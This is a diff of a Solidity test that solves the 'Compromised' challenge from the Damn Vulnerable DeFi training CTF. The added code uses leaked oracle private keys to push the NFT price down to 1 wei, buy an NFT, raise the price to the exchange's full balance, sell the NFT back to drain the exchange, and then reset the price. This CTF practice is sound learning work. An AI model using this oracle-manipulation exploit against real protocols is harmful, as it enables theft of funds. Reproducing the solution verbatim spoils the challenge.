@@ -6,7 +6,13 @@ import "@src/damn-vulnerable-defi/07-compromised/Exchange.sol";
 import "@src/damn-vulnerable-defi/07-compromised/TrustfulOracle.sol";
 import "@src/damn-vulnerable-defi/07-compromised/TrustfulOracleInitializer.sol";
 import "@src/damn-vulnerable-defi/DamnValuableNFT.sol";
+import {sl} from "@solc-log/sl.sol";
 
+///
+/// How to process the data from the challenge:
+/// Decode server response from hex to string, then decode from base64 to get private key
+/// hex -> base64 string -> normal string (private key)
+///
 contract CompromisedTest is BaseTest {
   
   TrustfulOracle oracle;
@@ -59,9 +65,7 @@ contract CompromisedTest is BaseTest {
 
     // Deploy the exchange and get an instance to the associated ERC721 token
     exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
-    nftToken = new DamnValuableNFT();
-    nftToken.grantRoles(address(exchange), nftToken.MINTER_ROLE());
-    nftToken.renounceOwnership();
+    nftToken = exchange.token();
     assertEq(nftToken.owner(), address(0));
     assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
 
@@ -69,10 +73,51 @@ contract CompromisedTest is BaseTest {
 
   function testCompromised() public {
     /** CODE YOUR SOLUTION HERE */
+    address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+    address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+    sl.log("oracle1: ", oracle1);
+    sl.log("oracle2: ", oracle2);
+
+    // Adjust price to make NFTs really cheap
+    vm.startPrank(oracle1);
+    oracle.postPrice(nftToken.symbol(), 1);
+
+    vm.startPrank(oracle2);
+    oracle.postPrice(nftToken.symbol(), 1);
+
+    sl.log("New median price: ", oracle.getMedianPrice(nftToken.symbol()));
+
+    // Now buy the NFT from the exchange
+    vm.startPrank(player);
+    uint256 nftBought = exchange.buyOne{value: 1}();
+    sl.log("Bought an NFT: ", nftBought);
+
+    // Set maximal price for the NFT, so exchange is left empty
+    uint256 maxPrice = address(exchange).balance;
+    sl.log("Max price: ", maxPrice);
+
+    vm.startPrank(oracle1);
+    oracle.postPrice(nftToken.symbol(), maxPrice);
+
+    vm.startPrank(oracle2);
+    oracle.postPrice(nftToken.symbol(), maxPrice);
+
+    // Now sell the NFT back to the exchange
+    vm.startPrank(player);
+    nftToken.approve(address(exchange), nftBought);
+    exchange.sellOne(nftBought);
+
+    // Bring back original DVNFT price 
+    vm.startPrank(oracle1);
+    oracle.postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);
+    
+    vm.startPrank(oracle2);
+    oracle.postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Exchange must have lost all ETH
-    assertEq(address(exchange).balance, 0);
+    assertEq(address(exchange).balance, 0, "Exchange balance must be 0");
         
     // Player's ETH balance must have significantly increased
     assertGt(player.balance, EXCHANGE_INITIAL_ETH_BALANCE);
@@ -81,6 +126,6 @@ contract CompromisedTest is BaseTest {
     assertEq(nftToken.balanceOf(player), 0);
 
     // NFT price shouldn't have changed
-    assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+    assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE, "DVNFT must have its initial price");
   }
 }
